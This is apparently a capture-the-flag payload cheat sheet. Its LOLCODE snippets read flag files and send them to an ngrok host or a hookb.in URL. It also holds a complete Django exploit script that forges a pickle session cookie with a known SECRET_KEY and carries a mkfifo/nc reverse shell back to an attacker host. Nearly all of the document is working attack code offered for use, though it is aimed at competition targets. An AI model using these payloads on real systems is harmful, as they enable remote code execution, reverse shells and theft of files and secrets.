# Python lolcode
Simple 
```
IN MAI os GIMME system LIKE exc F CAN HAS exc WIT "revshell"
```
Execute Commands (socket)
```
GIMME socket 
GIMME os
sock CAN HAS socket OWN socket THING BTW WIT socket.AF_INET AND socket.SOCK_STREAM! 
host CAN HAS "6.tcp.ngrok.io"
port CAN HAS 11064
data CAN HAS os OWN popen WIT "cat /opt/challenge/flag.txt "! OWN read THING
sock OWN connect WIT WIT host AND port!!
sock OWN send WIT data OWN encode THING !
```
Execute Commands (http)
```
GIMME os
GIMME urllib2
GIMME base64

cmd CAN HAS 'cat /opt/is/flag/for/me/flag.txt > out.txt'

os OWN system WIT cmd!

RF CAN HAS open WIT 'out.txt'!
RR CAN HAS RF OWN read THING

MB CAN HAS RR OWN encode WIT 'ascii'!
B64 CAN HAS base64 OWN b64encode WIT MB!

urllib2 OWN urlopen WIT 'https://hookb.in/QJ2NJ3NNaOC8mNzzlM08?flag=' ALONG WITH B64!
```
Read a local file
```
F CAN HAS open WIT "/flag.txt"!
S CAN HAS F OWN read THING
VISIBLE S
```

# Django pickle
```python
import subprocess
import pickle
from django.core import signing
from django.contrib.sessions.serializers import PickleSerializer
import requests

"""Change the following then change the cookie down"""
url = "http://challenge.nahamcon.com:30867/accounts/login/?next=/"
SECRET_KEY = '77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!'
Attacker_host = "8.tcp.ngrok.io"
Attacker_ip =  15762
""""""

class Exploit(object):
  def __reduce__(self):
    return (subprocess.Popen, (
      (f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Attacker_host} {Attacker_ip} >/tmp/f"),
      0, # Bufsize
      None, # exec
      None, #stdin
      None, #stdout
      None, #stderr
      None, #preexec
      False, #close_fds
      True, # shell
      ))

Forged_cookie = signing.dumps(Exploit(),
    key=SECRET_KEY,
    salt='django.contrib.sessions.backends.signed_cookies',
    serializer=PickleSerializer,
    compress=True)

print("\n\t\t\t\t[*-*] Django Pickle exploiter [*-*]\n")
print(f"[+] Forged the cookie: {Forged_cookie}\n")
print("[*] Sending the Payload...")


cookies = {"csrftoken": "K2Vx551ZkgLOdBvbqWRGMvjlPne158JiW4zYmA9UrBSCnW5IRmWLGWHuY5P3KPjQ", "sessionid": Forged_cookie}
req = requests.get(url, cookies=cookies)
print(f"[!] Request status: {req.status_code}")
print("[!] Check you nc listener anyway")
```

